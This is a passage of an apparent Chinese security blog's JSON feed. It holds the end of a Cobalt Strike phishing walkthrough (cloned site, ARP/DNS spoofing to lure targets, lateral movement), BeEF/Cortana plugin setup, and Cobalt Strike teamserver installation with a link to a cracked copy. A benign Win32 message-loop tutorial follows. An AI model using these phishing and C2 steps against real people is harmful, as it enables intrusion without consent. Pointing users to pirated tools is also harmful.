data-src=\"image031.png\" alt=\"\" /></p>\n<p>我们再克隆一下百度，放入 Attack</p>\n<p><img data-src=\"image032.png\" alt=\"\" /></p>\n<p>这里就不勾选键盘记录了，因为直接能控制对方了！</p>\n<p><img data-src=\"image033.png\" alt=\"\" /></p>\n<p>生成了网站链接，至于如何让目标访问这个网站，方法还是很多的，比如给目标来一个 ARP+DNS 欺骗，更改 DNS 解析包，强行让目标访问等。</p>\n<p>当目标一访问，这边就上线了。</p>\n<p><img data-src=\"image034.png\" alt=\"\" /></p>\n<p>不过这 IE 确实不行，我复现的这次 IE 直接裂开了……</p>\n<p><img data-src=\"image035.png\" alt=\"\" /></p>\n<p>网上找了个图，凑合着看吧。</p>\n<p><img data-src=\"image036.png\" alt=\"\" /></p>\n<p>通过控制，继续横向渗透即可！</p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>总结下思路，就是各种模块之间的配合进行简单的钓鱼，知道这些思路后，还可以和别的钓鱼工具配合，或者是别的方法融合！</p>\n<h1 id=\"强化cobalt-strike\"><a class=\"anchor\" href=\"#强化cobalt-strike\">#</a> 强化 Cobalt strike</h1>\n<p>Cortana 是可以用于 Cobalt strike 以及 Armitage 的脚本，通过加载 cortana 可以向 Cobalt strike 中导入新的第三方工具，最大的好处就是各种第三方工具都进行了可视化，你可以通过点击而不是通过命令行来完成一些操作，当然，通过定制 cortana 脚本，你可以在渗透测试过程中很方便的做一些批量操作或者自动化攻击等。</p>\n<p>扩展：</p>\n<p>Aggressor Script 是 Cobalt Strike 3.0 版及更高版本中内置的脚本语言。Aggresor 脚本允许您修改和扩展 Cobalt Strike 客户端。</p>\n<p>Aggressor Script 是 Armitage 中开源脚本引擎 Cortana 的精神继任者。Cortana 是通过 DARPA 的 “网络快速通道” 计划的合同而成为可能的。Cortana 允许其用户通过 Armitage 的团队服务器扩展 Armitage 并控制 Metasploit 框架及其功能。Cobalt Strike 3.0 是对 Cobalt Strike（无 Armitage）基础的完全重写。这一更改提供了重新审视 Cobalt Strike 脚本并围绕 Cobalt Strike 功能构建内容的机会。这项工作的结果是 Aggressor Script。</p>\n<p>也就是说 Cobalt Strike 3.0 版本之后是 Aggressor。</p>\n<p>下载 cortana-scripts：</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvY29ydGFuYS1zY3JpcHRzLmdpdA==\">https://github.com/rsmudge/cortana-scripts.git</span></p>\n</blockquote>\n<h2 id=\"beef\"><a class=\"anchor\" href=\"#beef\">#</a> Beef</h2>\n<p>Beef 是一款针对浏览器的渗透测试工具，而 beef_strick 则是可以在 Cobalt strike 及 Armitage 中加载 Beef 的一个 Cortana 脚本，要使用此脚本，首先要先下载安装 msf 的 beef 插件。</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3hudHJpay9iZWVmbWV0YXNwbG9pdHBsdWdpbi5naXQ=\">https://github.com/xntrik/beefmetasploitplugin.git</span><br />\ncd beefmetasploitplugin<br />\ncp -R lib/* /usr/share/metasploit-framework/lib/<br />\ngem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p>安装依赖库，执行：</p>\n<blockquote>\n<p>gem install hpricot<br />\ngem install json</p>\n</blockquote>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p>启动 msf 加载 beef</p>\n<blockquote>\n<p>msf6 &gt; load beef</p>\n</blockquote>\n<p>若遇到此问题</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>这样解决。</p>\n<blockquote>\n<p>cp -R /var/lib/gems/2.7.0/gems/hpricot-0.8.6/lib/* /usr/lib/ruby/vendor_ruby</p>\n</blockquote>\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<p>这里注意若出现以下报错：</p>\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>则要结合自己实际情况，例：查看 gems 目录下的文件名、hpricot-x.x.x。</p>\n<p>现在再启动 msf，就可以加载 beef 了</p>\n<p><img data-src=\"image019.png\" alt=\"\" /></p>\n<h2 id=\"cs免杀-mac写入内存\"><a class=\"anchor\" href=\"#cs免杀-mac写入内存\">#</a> CS 免杀 - MAC 写入内存</h2>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMTEyNzQ2OTk=\">https://blog.csdn.net/qq_34801745/article/details/111274699</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3NzAyNy9hcnRpY2xlL2RldGFpbHMvMTEwNzIyMzgy\">https://blog.csdn.net/weixin_39677027/article/details/110722382</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL3ppcmMwbi9lc2NiaGcvcXhnZm51\">https://www.yuque.com/zirc0n/escbhg/qxgfnu</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLndncHNlYy5vcmcva25vd2xlZGdlL2ludHJhbmV0L0NvYmFsdC1TdHJpa2UuaHRtbA==\">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNzcxNjkubmV0L2h0bWwvMjUzMjIxLmh0bWw=\">https://www.77169.net/html/253221.html</span></p>\n",
            "tags": [
                "CobaltStrike",
                "CobaltStrike"
            ]
        },
        {
            "id": "https://self-ferry.github.io/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "url": "https://self-ferry.github.io/CobaltStrike%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/",
            "title": "CobaltStrike的安装和配置",
            "date_published": "2021-07-06T08:58:41.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Cobalt Strike 是一款内网渗透测试工具，常被业界人称为 CS。Cobalt Strike 2.0 版本主要是结合 Metasploit 可以称为图形化 MSF 工具。而 Cobalt Strike 3.0 已经不再使用 Metasploit 框架而作为一个独立的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。客户端模式和服务端模式可以在 Windows 以及 Linux 上运行。<br />\nCobalt Strike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe 木马生成，win dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等</p>\n<h1 id=\"安装cobaltstrike\"><a class=\"anchor\" href=\"#安装cobaltstrike\">#</a> 安装 CobaltStrike</h1>\n<p>有能力的可以支持一下正版 Cobalt Strike 官网: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbQ==\">https://www.cobaltstrike.com</span>。</p>\n<p>没有能力我们就用学 (po) 习 (jie) 版。</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWZiMXBTTmZGVWFjT2hxVlQ5b3BsaEE=\">https://pan.baidu.com/s/1fb1pSNfFUacOhqVT9oplhA</span><br />\n 提取码：rolr</p>\n<p>这个是 Linux 版本<br />\n下载解压后文件如下：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"目录结构\"><a class=\"anchor\" href=\"#目录结构\">#</a> 目录结构</h1>\n<pre><code>│  cobaltstrike.jar 【主体程序、客户端启动程序】\n│  teamserver  【Linux服务端启动程序(linux shell脚本)】\n|─third-party 第三方工具 【vnc远程功能的dll】\n|        README.vncdll.txt\n|        winvnc.x64.dll 【vnc服务端dllx64位】\n|        winvnc.x86.dll 【vnc服务端dllx86位】\n│  agscript 【拓展应用的脚本】\n│  c2lint  【检查c2配置文件的语法和预览】\n|  peclone 【用来解析dll】\n</code></pre>\n<h1 id=\"客户端与服务端的连接\"><a class=\"anchor\" href=\"#客户端与服务端的连接\">#</a> 客户端与服务端的连接</h1>\n<p>Cobalt Strike 使用 C/S 架构，Cobalt Strike 的客户端连接到团队服务器，团队服务器连接到目标，也就是说 Cobalt Strike 的客户端不与目标服务器进行交互。</p>\n<h2 id=\"启动服务端\"><a class=\"anchor\" href=\"#启动服务端\">#</a> 启动服务端</h2>\n<p>cobaltstrike.jar 既是服务端程序也是客户端程序，一般情况 Linux 用 teamserver 启动服务端。</p>\n<pre><code>teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]\n\n    &lt;host&gt; is the (default) IP address of this Cobalt Strike team server\n    &lt;password&gt; is the shared password to connect to this server\n    [/path/to/c2.profile] is your Malleable C2 profile\n    [YYYY-MM-DD] is a kill date for Beacon payloads run from this server\n</code></pre>\n<p>第一个参数为服务器监听 IP 地址 此选项为必填选项</p>\n<p>第二个参数为服务器连接密码客户端使用此密码连接服务器 此选项为必填选项</p>\n<p>第三个参数为 Malleable C2 profile 配置文件如果不使用可以不用填写 此选项为可选选项<br />\n这是开源的 Malleable C2 profile 文件<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvTWFsbGVhYmxlLUMyLVByb2ZpbGVz\"> https://github.com/rsmudge/Malleable-C2-Profiles</span></p>\n<p>第四个参数为 Beacon 有效负载运行结束日期。如果设置此选项则 CS 生成的每个 Beacon stage 中都将嵌入此结束日期，Beacon payload 在此日期后将拒绝运行，处于 sleep 状态的 Beacon payload 醒来后也将自动退出结束运行 此选项为可选选项</p>\n<p>例:<img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"启动客户端\"><a class=\"anchor\" href=\"#启动客户端\">#</a> 启动客户端</h2>\n<p>使用此命令可以直接运行</p>\n<p><code>java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></p>\n<p>为了方便我们把这句话保存在 <code>start.sh</code>  的 shell 脚本里面。</p>\n<p>当 Cobalt Strike 客户端启动时，你会看到一个连接对话框</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>输入主机 ip，连接端口 (默认 50050)，以及你想使用的用户名和服务端启动时设置的密码然后点击连接就可以连接到服务器了。</p>\n<p>点击 Connect 连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击 Yes，随后即可打开 CS 客户端界面</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>在连接后，团队之间就可以通过客户端进行沟通，信息共享。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n",
            "tags": [
                "CobaltStrike",
                "CobaltStrike"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/",
            "url": "https://self-ferry.github.io/Win%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/",
            "title": "Win消息机制和消息类型",
            "date_published": "2021-07-05T14:48:49.000Z",
            "content_html": "<h1 id=\"事件和消息\"><a class=\"anchor\" href=\"#事件和消息\">#</a> 事件和消息</h1>\n<p>Windows 中的事件是一个 &quot;动作&quot;，这个动作可能是用户操作应用程序产生的，也可能是 Windows 自己产生的.<br />\n 而消息，就是用来描述这些 &quot;动作&quot; 的，比如：</p>\n<p>1 这个动作是什么时候产生的？<br />\n2 哪个应用程序产生的？<br />\n3 在什么位置产生的？<br />\n等等。。。</p>\n<h2 id=\"事件驱动消息-消息封装事件\"><a class=\"anchor\" href=\"#事件驱动消息-消息封装事件\">#</a> 事件驱动消息 消息封装事件</h2>\n<p>Windows 为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">tagMSG</span> <span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            HWND hwnd<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 窗口句柄</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            UINT message<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 消息类型</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            WPARAM wParam<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 对消息类型进一步描述</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            LPARAM lParam<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 同上</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            DWORD time<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 动作发生时间</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            POINT pt<span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 坐标，结构体封装了，内部是 x，y</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span> MSG<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PMSG<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>说明：</p>\n<blockquote>\n<p>1、hwnd<br />\n 表示消息所属的窗口<br />\n一个消息一般都是与某个窗口相关联的<br />\n在 Windows 中 HWND 类型的变量通常用来标识窗口。</p>\n</blockquote>\n<blockquote>\n<p>2、message<br />\n 在 Windows 中，消息是由一个数值来表示的<br />\n但是由于数值不便于记忆，所以 Windows 将消息对应的数值定义为 WM_XXX 宏（WM == Window Message）<br />\n鼠标左键按下 WM_LBUTTONDOWN        键盘按下 WM_KEYDOWN</p>\n</blockquote>\n<blockquote>\n<p>3、wParam 和 lParam<br />\n32 位消息的特定附加信息，具体表示什么处决于 message</p>\n</blockquote>\n<blockquote>\n<p>4、time<br />\n 消息创建时的时间</p>\n</blockquote>\n<blockquote>\n<p>5、消息创建时的鼠标位置</p>\n</blockquote>\n<p>具体来说：如下图，用户输入后，封装成消息，加入系统的消息队列，然后应用程序那还有队列</p>\n<p>用来存储自己的消息队列，所以系统队列到应用程序队列是分流而治的过程。</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>从队列中取出消息，使用的是循环机制，就是不停的取出消息，而后面的判断消息类型是不是我们关心的意思其实是</p>\n<p>我们是否写了该消息下的响应函数，或者说回调函数。</p>\n<p>具体流程如下图：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h1 id=\"消息机制\"><a class=\"anchor\" href=\"#消息机制\">#</a> 消息机制</h1>\n<p>我们了解了窗口其实是绘制出来的，而且是不断绘制的过程，所以窗口的本质是绘制， 但是我们现在看到的窗口程序，都可以点击关闭按钮 使用鼠标点击会有反应.</p>\n<p>而我们要怎么实现呢？</p>\n<p>其实鼠标点击是产生了一个消息。window 把这个消息封装成了消息结构体。 发送给了我们的窗口程序。</p>\n<p>那么 windows 怎么知道你点击的那个窗口呢？</p>\n<p>是这样的 当我们点击的时候 会记录点击坐标。消息。等等 windows 系统会接受到 然后遍历内核中的 WINOBJ 结构 而这个结构中存储着窗口对象 窗口对象对应着消息线程.</p>\n<p>所以 windows 一层一层的遍历。则找到了对应的窗口以及窗口对应的线程。然后发送给我们的应用程序</p>\n<p>上面说的我们需要了解 要知道消息怎么产生的 怎么传递的。那么下面编程就明白了.</p>\n<p>例如下图:</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>每个应用程序都有一个线程对象 而这个线程对象如果创建窗口。那么内核中就有这个窗口对象.</p>\n<p>如果我们有鼠标点击的消息。键盘消息等等。操作系统都会遍历窗口对象 而窗口对象也会保存着创建这个窗口对象对应的线程对象 而这个线程对象中则有消息队列.</p>\n<p>这样的话操作系统则会封装消息发送给我们窗口对象</p>\n<h1 id=\"消息类型\"><a class=\"anchor\" href=\"#消息类型\">#</a> 消息类型</h1>\n<p>我们回调中有我们的消息类型，我们可以判断消息类型进行我们不同的操作。</p>\n<p>比如菜单消息</p>\n<p><code>WM_COMMAND</code> ， 如果是这个消息。那么回调函数的 <code>wparam</code>  等附加信息就是 <code>WM_COMMAND</code>  的附加消息了 我们可以取低位得出操作的菜单 ID. 进而进行消息处理.</p>\n<p><code>WM_PAINT</code>  这个消息是绘制的消息。我们知道。窗口是不断绘制的。所以绘制消息会一直来.</p>\n<p><code>WM_DESTROY</code>   窗口关闭消息 如果接受到这个消息。则调用 API 往消息队列中 (MSG) 中传递退出消息 此时外层主线程就会结束.</p>\n<p>具体 API:<br />\n <code>postQuitMessage(0);</code></p>\n<p>当前具体的消息还要查询 MSDN, 因为消息种类很多.</p>\n<p>windows 消息都是 WM 开头的</p>\n<p>比如查询 <code>WM_COMMAND</code>  消息</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>可以清楚的看到它会告诉你如果是 <code>WM_COMMAND</code>  消息来了那么回调函数的参数分别代表的是什么意思。</p>\n<h1 id=\"窗口类结构\"><a class=\"anchor\" href=\"#窗口类结构\">#</a> 窗口类结构</h1>\n<p>创建窗口程序</p>\n<h2 id=\"进行窗口编程需要注意的问题\"><a class=\"anchor\" href=\"#进行窗口编程需要注意的问题\">#</a> 进行窗口编程需要注意的问题</h2>\n<p>在 Windows 中进行窗口编程，入口点已经改成 WinMain 了 有四个参数</p>\n<p>如以下代码所示</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> APIENTRY <span class=\"token function\">wWinMain</span><span class=\"token punctuation\">(</span>_In_ HINSTANCE hInstance<span class=\"token punctuation\">,</span>               <span class=\"token comment\">// 窗口的实例句柄 hinstance 代表模块意思 HWND 代表窗口意思 HANDLE 代表内核对象 HDC 设备上下文</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                     _In_opt_ HINSTANCE hPrevInstance<span class=\"token punctuation\">,</span>        <span class=\"token comment\">// 父窗口句柄   已淘汰</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                     _In_ LPWSTR    lpCmdLine<span class=\"token punctuation\">,</span>                <span class=\"token comment\">// 命令行参数</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                     _In_ <span class=\"token keyword\">int</span>       nCmdShow<span class=\"token punctuation\">)</span>                 <span class=\"token comment\">// 命令 最大化命令还是最小化命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>wWinMain</code>  因为有 <code>UNICODE</code>  跟 <code>ASCII</code>  区别，所以 <code>UNICODE</code>  使用 <code>wWinMain</code> ， <code>ASCII</code>  版就是用 <code>WinMain</code></p>\n<p>这里我上网上查了一下</p>\n<p>其实并不是程序中有中文时就必须用 <code>Unicode</code>  字符集，当 <code>windows</code>  系统语言为中文时，不管你选择哪个字符集都是可以正常显示中文的，但是系统语言不为中文时就会出现乱码了。所以如果你的软件需要适应多语言的 <code>windows</code>  系统的话就得用 <code>Unicode</code>  字符集。</p>\n<p>另外需要说明的是，当字符集为 <code>Unicode</code>  时，向 api 函数传递的一个字符串的时候应该将该字符串转换为 <code>Unicode</code>  编码的，可用 L 转换：<br />\n <code>CreateWindow(wndClass, L&quot;这是窗口标题&quot;, ......);</code></p>\n<h2 id=\"进行windows编程的调试手法\"><a class=\"anchor\" href=\"#进行windows编程的调试手法\">#</a> 进行 Windows 编程的调试手法</h2>\n<p>在 Windows 中我们调试程序不能简单的使用 printf 进行调试。或者打印输出了 我们可以使用两个 API 进行操作.</p>\n<p>1  <code>wsprintf()</code>  格式化字符串</p>\n<p>2  <code>OutPutDebugString()</code>  输出调试字符串</p>\n<p>详细参见百科：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS93c3ByaW50Zg==\">https://baike.baidu.com/item/wsprintf</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9PdXRwdXREZWJ1Z1N0cmluZw==\">https://baike.baidu.com/item/OutputDebugString</span></p>\n<p>因为 <code>OutPutDebugString()</code>  只能打印固定字符串</p>\n<p>所以使用 wsprintf 进行格式化字符串，如下面代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> APIENTRY <span class=\"token function\">wWinMain</span><span class=\"token punctuation\">(</span>_In_ HINSTANCE hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    _In_opt_ HINSTANCE hPrevInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    _In_ LPWSTR    lpCmdLine<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _In_ <span class=\"token keyword\">int</span>       nCmdShow<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    TCHAR str<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">wsprintf</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span> L<span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"HelloWin32\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">//MessageBox (0, str, 0, MB_OK);// 也可以弹个窗</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">OutputDebugString</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们编译出程序之后，可以使用 DebugView 这款工具查看，也可以在编译器的调试窗口看</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"窗口编程的步骤\"><a class=\"anchor\" href=\"#窗口编程的步骤\">#</a> 窗口编程的步骤</h2>\n<p>1 创建窗口类<br />\n windows 提供的窗口样式。我们需要给定.</p>\n<p>2 注册窗口类<br />\n创建了窗口我们需要注册到 windows 系统中.</p>\n<p>3 创建窗口</p>\n<p>如果注册窗口成功。那么我们需要创建出来这个窗口。并且显示跟更新.</p>\n<p>4 消息处理</p>\n<h2 id=\"窗口编程需要的主要结构\"><a class=\"anchor\" href=\"#窗口编程需要的主要结构\">#</a> 窗口编程需要的主要结构</h2>\n<p>窗口的创建 Windows 已经为我们提供了，这个结构就是 <code>WNDCLASSEX</code>  结构</p>\n<p>看下这个结构中的内容吧</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_WNDCLASSEX</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    UINT       cbSize<span class=\"token punctuation\">;</span>                   扩展的大小 既自己WndClass本身大小<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    UINT       style<span class=\"token punctuation\">;</span>                    风格</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    WNDPROC    lpfnWndProc<span class=\"token punctuation\">;</span>              窗口回调<span class=\"token punctuation\">.</span>消息都要进入这个回调</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span>        cbClsExtra<span class=\"token punctuation\">;</span>              </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span>        cbWndExtra<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    HINSTANCE  hInstance<span class=\"token punctuation\">;</span>                实例句柄</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    HICON      hIcon<span class=\"token punctuation\">;</span>                    图标</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    HCURSOR    hCursor<span class=\"token punctuation\">;</span>                  光标</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    HBRUSH     hbrBackground<span class=\"token punctuation\">;</span>            背景</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    LPCTSTR    lpszMenuName<span class=\"token punctuation\">;</span>             菜单名称</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    LPCTSTR    lpszClassName<span class=\"token punctuation\">;</span>            类名称</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    HICON      hIconSm<span class=\"token punctuation\">;</span>                  最小化图标</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span> WNDCLASSEX<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PWNDCLASSEX<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>你的窗口是什么样式、 大小、是否有图标、 消息处理函数在哪里等等，需要我们给指定。<br />\n还有一个 <code>WNDCLASS</code>  结构，这个是兼容老版本的。如今一般用 <code>WNDCLASSEX</code></p>\n<p>详细见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMjQzMDY1L2FydGljbGUvZGV0YWlscy84MzUxMzc5NQ==\"> https://blog.csdn.net/qq_31243065/article/details/83513795</span></p>\n<h1 id=\"创建一个窗口程序的详细步骤\"><a class=\"anchor\" href=\"#创建一个窗口程序的详细步骤\">#</a> 创建一个窗口程序的详细步骤</h1>\n<blockquote>\n<p>步骤 1：创建 Windows 应用程序 选择空项目<br />\n步骤 2：在新建项窗口中选 C++ 代码文件 创建一个新的 cpp 文件<br />\n步骤 3：在新的 cpp 文件中添加: <code>#include &lt;Windows.h&gt;</code> <br />\n 并添加入口函数：</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> CALLBACK <span class=\"token function\">WinMain</span><span class=\"token punctuation\">(</span>                 <span class=\"token comment\">// CALLBACK 是一个宏  #define CALLBACK __stdcall   所有的 Win32 API 函数都遵循该约定 此外 #define WINAPI __stdcall  #define APIENTRY    WINAPI        </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            _In_ HINSTANCE hInstance<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 应用程序当前实例的句柄</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            _In_ HINSTANCE hPrevInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            _In_ LPSTR lpCmdLine<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            _In_ <span class=\"token keyword\">int</span> nCmdShow</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>步骤 4：设计窗口类<br />\n既能用 <code>WNDCLASS</code>  也能用 <code>WNDCLASSEX</code> <br />\n 例：</p>\n</blockquote>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 窗口的类名    </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>TCHAR className<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"My First Window\"</span><span class=\"token punctuation\">;</span>     </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 创建窗口类的对象     </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>WNDCLASS wndclass <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 一定要先将所有值赋值</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>wndclass<span class=\"token punctuation\">.</span>hbrBackground <span class=\"token operator\">=</span> <span class=\"token 